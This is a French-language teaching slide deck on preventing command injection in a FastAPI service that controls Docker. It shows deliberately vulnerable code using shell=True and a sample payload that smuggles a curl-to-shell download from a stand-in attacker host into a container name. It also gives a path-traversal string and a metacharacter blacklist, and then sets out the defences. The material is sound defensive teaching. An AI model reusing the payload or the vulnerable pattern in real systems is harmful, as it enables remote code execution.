## 4. Valider les entrées, bloquer l'injection

<p class="lead">Votre API tourne avec des droits d'administration. Tout ce qu'elle reçoit est suspect, même venant d'un client authentifié.</p>

---

## L'API qui fait confiance

Une première version, « pour aller vite », qui appelle la commande `docker` :

```python
@app.post("/containers")
def creer(demande: dict):
    commande = f"docker run -d --name {demande['name']} {demande['image']}"
    subprocess.run(commande, shell=True)        # ← le problème est ici
    return {"status": "ok"}
```

Un client envoie :

```json
{ "name": "web1; curl http://pirate.example/x.sh | sh #", "image": "nginx" }
```

Le shell exécute :

```bash
docker run -d --name web1; curl http://pirate.example/x.sh | sh # nginx
```

<p class="lead ko">Deux commandes. La seconde est celle de l'attaquant, avec les droits de votre API.</p>

---

## L'injection : des données lues comme du code

<div class="left">

Le mécanisme est toujours le même : une **donnée** fournie par le client est **collée dans un
texte** qu'un interpréteur va **exécuter**.

| Interpréteur | Nom de l'attaque |
|---|---|
| le shell | injection de commande |
| la base de données | injection SQL |
| le système de fichiers | traversée de chemin (`../../etc/passwd`) |
| un moteur de templates | injection de template |

</div>

<div class="valid">
<strong>La parade de fond</strong> : ne jamais construire une commande, une requête ou un chemin par concaténation de texte. Passer les données <strong>en tant que données</strong>, par un canal qui ne les interprète pas.
</div>

---

## Parade 1 : ne pas passer par le shell

<div class="cols">
<div>
<h4 class="ko">✗ Une chaîne interprétée par le shell</h4>
<pre><code class="language-python">subprocess.run(
    f"docker stop {nom}",
    shell=True,
)</code></pre>
<p class="small"><code>;</code> <code>|</code> <code>&amp;&amp;</code> <code>$( )</code> et les accents graves sont interprétés.</p>
</div>
<div>
<h4 class="ok">✓ Une liste d'arguments</h4>
<pre><code class="language-python">subprocess.run(
    ["docker", "stop", nom],
    check=True, timeout=30,
)</code></pre>
<p class="small">Aucun shell : <code>nom</code> est un seul argument, quoi qu'il contienne.</p>
</div>
</div>

<div class="left">

Mieux encore, et c'est le choix du projet : **appeler l'API** plutôt que la commande.

```python
session.post(f"{DOCKER}/containers/create", params={"name": nom}, json=corps, timeout=10)
```

`requests` encode `nom` dans l'URL et sérialise `corps` en JSON : les données restent des données.

</div>

---

## Parade 2 : valider à l'entrée

Avec pydantic, la forme attendue du corps est **déclarée**, et FastAPI refuse tout le reste
avant même d'entrer dans votre fonction.

```python
from typing import Literal
from pydantic import BaseModel, Field

Image = Literal["nginx:alpine", "redis:alpine", "httpd:alpine"]


class ConteneurACreer(BaseModel):
    name: str = Field(pattern=r"^[a-z][a-z0-9-]{1,30}$", examples=["web1"])
    image: Image


@app.post("/containers", status_code=201, summary="Crée et démarre un conteneur")
def creer(demande: ConteneurACreer, role: str = Depends(exiger_admin)):
    ...                               # ici, demande.name et demande.image sont sûrs
```

<p class="small">Champ manquant, type faux, nom qui ne respecte pas le motif, image hors liste : <strong>422</strong> automatique, avec le détail du champ fautif. Vous n'écrivez aucun <code>if</code>.</p>

---

## Liste blanche, jamais liste noire

<div class="cols">
<div>
<h4 class="ko">✗ Liste noire : interdire le mal</h4>
<pre><code class="language-python">INTERDITS = [";", "|", "&amp;", "$", "`"]
if any(c in nom for c in INTERDITS):
    raise HTTPException(422)</code></pre>
<p class="small">Et le retour à la ligne ? Et <code>../</code> ? Et le caractère que vous ne connaissez pas ? Une liste noire est <strong>toujours incomplète</strong>.</p>
</div>
<div>
<h4 class="ok">✓ Liste blanche : n'autoriser que le bien</h4>
<pre><code class="language-python">pattern=r"^[a-z][a-z0-9-]{1,30}$"</code></pre>
<p class="small">Une minuscule, puis des minuscules, chiffres ou tirets. Tout ce qui n'est <strong>pas explicitement permis</strong> est refusé, y compris ce à quoi vous n'avez pas pensé.</p>
</div>
</div>

<div class="memo">
Même raisonnement pour l'image : votre API n'accepte pas « n'importe quelle image sauf les dangereuses », elle accepte <strong>trois images connues</strong>. Sans cela, n'importe quel client admin ferait tourner n'importe quel code sur la machine.
</div>

---

## Parade 3 : le moindre privilège

<div class="left">

Supposez que la validation a un trou. Que peut faire l'attaquant ? **Ce que votre API a le droit de faire.**

| Mesure | Dans le projet |
|---|---|
| Ne pas exposer le socket Docker brut | le proxy `docker-api` ne laisse passer que les familles d'appels utiles |
| Restreindre le périmètre | seuls les conteneurs étiquetés `adminapi.managed=true` sont visibles |
| Séparer les rôles | lecteur et admin, deux tokens |
| N'écouter que là où il faut | ports publiés sur `127.0.0.1`, pas sur toutes les interfaces |
| Un compte de service limité | un token NetBox dédié, pas celui de l'administrateur (en production) |

</div>

<p class="lead">La validation évite l'accident. Le moindre privilège limite les dégâts quand la validation a échoué.</p>

---

## Traduire les erreurs de l'amont

Votre API appelle Docker. Les codes de Docker ne sont pas ceux de votre contrat.

| Docker répond | Signifie | Votre API répond |
|---|---|---|
| `404` sur `/containers/{id}/json` | conteneur inconnu | **404** |
| `409` sur `/containers/create` | nom déjà pris | **409** |
| `304` sur `/stop` ou `/start` | déjà dans cet état | **409** |
| `404` sur `/containers/create` | image absente de la machine | à vous de la tirer, ou **502** |
| pas de réponse, `5xx` | Docker en panne | **502** Bad Gateway |

<div class="memo">
<strong>502, pas 500.</strong> 500 dit « mon code a un bug ». 502 dit « un service dont je dépends a échoué ». Celui qui reçoit l'alerte à 3 heures du matin ne cherche pas au même endroit.
</div>

---

## Ce qu'il faut retenir

<div class="left">

1. **Injection** : une donnée du client est interprétée comme du code.
2. Ne jamais **concaténer** une entrée dans une commande, une requête ou un chemin.
3. **`shell=True` est interdit** avec une entrée extérieure. Mieux : appeler l'API, pas la commande.
4. **Valider à l'entrée**, par un schéma (pydantic). Refus automatique en **422**.
5. **Liste blanche** : on énumère ce qui est permis. Une liste noire est toujours incomplète.
6. **Moindre privilège** : limiter ce que l'API peut faire limite ce qu'un attaquant peut faire.

</div>
